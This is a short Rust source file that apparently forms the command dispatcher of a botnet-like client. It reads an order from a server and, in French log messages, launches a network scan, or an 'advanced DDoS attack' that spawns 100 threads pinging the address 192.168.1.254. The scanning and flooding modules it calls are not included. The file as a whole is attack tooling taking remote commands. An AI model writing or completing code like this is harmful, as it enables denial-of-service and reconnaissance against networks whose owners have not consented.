
use std::thread;
use std::thread::JoinHandle;

mod scan;
mod ddos;

use std::borrow::Cow;
use std::sync::{Arc, Mutex};


pub(crate) fn ordre_du_srv(mut ordre: String) {

        let shared_ordre = Arc::new(Mutex::new(ordre));

        if shared_ordre.lock().unwrap().contains("scan") {
            println!("Lancement du scan réseau");
            let ordre_clone = Arc::clone(&shared_ordre);
            let t = thread::spawn(move || {
                scan::scan(scan::find_net(), ordre_clone.lock().unwrap().clone());
            });
        }

        if shared_ordre.lock().unwrap().contains("ddos") {
            println!("Lancement de l'attaque ddos avancée");
            for i in 0..100 {
                println!("Lancement de l'attaque ddos n°{}", i);
                let ordre_clone = Arc::clone(&shared_ordre);
                let ddos = thread::spawn(move || {
                    ddos::ping("192.168.1.254");
                });
                println!("Fin de l'attaque ddos n°{}", i);
            }
        }

        println!("{:?}", shared_ordre.lock().unwrap().as_str());
    }


